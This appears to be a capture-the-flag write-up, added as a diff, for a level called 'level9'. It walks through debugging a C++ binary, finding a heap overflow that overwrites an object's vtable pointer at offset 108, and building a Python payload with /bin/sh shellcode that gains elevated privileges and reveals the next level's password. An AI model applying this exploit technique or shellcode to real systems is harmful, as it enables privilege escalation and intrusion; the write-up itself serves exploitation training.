@@ -1,1 +1,149 @@
 # level9
+
+Quick look at the binary:
+
+```bash
+$ ./level9
+$ ./level9 AAAAAAAAAAAAAAAAAAAAAAA
+$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+```
+
+The binary segfaults when we pass a string that's long enough. Let's open it with ghidra and see what's going on.
+
+```c++
+
+void main(int param_1,int param_2)
+
+{
+  N *this;
+  undefined4 *this_00;
+  
+  if (param_1 < 2) {
+                    /* WARNING: Subroutine does not return */
+    _exit(1);
+  }
+  this = (N *)operator.new(0x6c);
+  N::N(this,5);
+  this_00 = (undefined4 *)operator.new(0x6c);
+  N::N((N *)this_00,6);
+  N::setAnnotation(this,*(char **)(param_2 + 4));
+  (**(code **)*this_00)(this_00,this);
+  return;
+}
+```
+
+This cursed stuff reveals that it is a C++ program.
+
+Running it through `gdb` and making it segfault again :
+
+```sh
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x41414141 ("AAAA"?)
+$ebx   : 0x0804d420  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ecx   : 0x0       
+$edx   : 0x08048770  →  <__libc_csu_init+0> push ebp
+$esp   : 0xffffd4f0  →  0x0804d3b0  →  0x08048848  →  0x0804873a  →  <N::operator+(N&)+0> push ebp
+$ebp   : 0xffffd518  →  0x00000000
+$esi   : 0x08048770  →  <__libc_csu_init+0> push ebp
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x08048682  →  <main+142> mov edx, DWORD PTR [eax]
+$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd4f0│+0x0000: 0x0804d3b0  →  0x08048848  →  0x0804873a  →  <N::operator+(N&)+0> push ebp	 ← $esp
+0xffffd4f4│+0x0004: 0xffffd7b5  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd4f8│+0x0008: 0xf7a4e9e9  →  <__cxa_atexit+9> add eax, 0x1ab60b
+0xffffd4fc│+0x000c: 0x080486d8  →  <__static_initialization_and_destruction_0(int,+0> leave 
+0xffffd500│+0x0010: 0x0804d420  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd504│+0x0014: 0x0804d3b0  →  0x08048848  →  0x0804873a  →  <N::operator+(N&)+0> push ebp
+0xffffd508│+0x0018: 0x0804d420  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd50c│+0x001c: 0x0804d3b0  →  0x08048848  →  0x0804873a  →  <N::operator+(N&)+0> push ebp
+────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+    0x8048677 <main+131>       call   0x804870e <_ZN1N13setAnnotationEPc>
+    0x804867c <main+136>       mov    eax, DWORD PTR [esp+0x10]
+    0x8048680 <main+140>       mov    eax, DWORD PTR [eax]
+ →  0x8048682 <main+142>       mov    edx, DWORD PTR [eax]
+    0x8048684 <main+144>       mov    eax, DWORD PTR [esp+0x14]
+    0x8048688 <main+148>       mov    DWORD PTR [esp+0x4], eax
+    0x804868c <main+152>       mov    eax, DWORD PTR [esp+0x10]
+    0x8048690 <main+156>       mov    DWORD PTR [esp], eax
+    0x8048693 <main+159>       call   edx
+────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "level9_bin", stopped 0x8048682 in main (), reason: SIGSEGV
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x8048682 → main()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  x/10i $eip
+=> 0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
+   0x8048684 <main+144>:	mov    eax,DWORD PTR [esp+0x14]
+   0x8048688 <main+148>:	mov    DWORD PTR [esp+0x4],eax
+   0x804868c <main+152>:	mov    eax,DWORD PTR [esp+0x10]
+   0x8048690 <main+156>:	mov    DWORD PTR [esp],eax
+   0x8048693 <main+159>:	call   edx
+   0x8048695 <main+161>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x8048698 <main+164>:	leave
+   0x8048699 <main+165>:	ret
+   0x804869a <_Z41__static_initialization_and_destruction_0ii>:	push   ebp
+```
+
+So it seems like the segfault happens when the program tries to call the function pointer stored in `eax`. Let's see what's in `eax`:
+
+```sh
+gef➤  x/x $eax
+0x62616163:	Cannot access memory at address 0x62616163
+gef➤  pattern search $eax
+[+] Searching for '63616162'/'62616163' with period=4
+[+] Found at offset 108 (little-endian search) likely
+```
+
+```sh
+$ gdb ./level9
+(gdb) r $(python -c 'print "A"*108 + "BBBB"')
+Starting program: /home/user/level9/level9 $(python -c 'print "A"*108 + "BBBB"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) x $eax
+0x42424242:	Cannot access memory at address 0x42424242
+```
+
+To find what to overwrite we will break before the segfault, at `main+136`
+
+```sh
+$ gdb ./level9
+(gdb) b *main+136
+Breakpoint 1 at 0x804867c
+(gdb) run 'ABCD'
+Starting program: /home/user/level9/level9 'ABCD'
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:	0x44434241
+```
+
+Perfect, we will make it dereference itself and execute our shellcode.
+
+> https://shell-storm.org/shellcode/files/shellcode-811.html
+
+```python
+import struct
+
+START_ADDY = 0x804a00c + 4
+SHELL_CODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+
+payload = struct.pack('<I', START_ADDY) # Start of the shellcode in the memory
+payload += SHELL_CODE # Shellcode
+payload += 'A' * (108 - len(payload)) # Pad to overflow
+payload += struct.pack('<I', START_ADDY - 4) # As if nothing happened
+print payload
+```
+
+```sh
+./level9 $(python /tmp/payload.py)
+$ id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
